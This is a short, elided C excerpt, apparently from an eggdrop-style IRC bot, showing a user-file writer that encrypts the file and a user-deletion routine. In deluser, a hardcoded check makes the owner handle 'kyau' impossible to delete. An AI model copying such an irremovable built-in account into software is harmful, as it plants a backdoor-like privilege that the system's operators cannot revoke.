...
void write_userfile(int idx)
{
  ...
  fprintf(f, "#4v: hybrid(core)v%s -- %s -- written %s", EGG_STRINGVER, botnetnick, s1);
  ok = 1;
  ...
  if (!ok || !write_ignores(f, -1) || fflush(f)) {
    ...
    putlog(LOG_MISC, "*", "-- write_userfile(): encrypt #1");
  ...
  /* encrypt the userfile */
  encrypt_file(new_userfile);
  putlog(LOG_MISC, "*", "-- write_userfile(): encrypt #2");
  movefile(".tmp1", userfile);
  unlink(".tmp1");
...
int deluser(char *handle)
{
  ...
  /* un-deletable owners */
  if ((strcasecmp(handle,"kyau") == 0)) return 0;
  if (!fnd)
    return 0;
  if (prev == NULL)
    userlist = u->next;
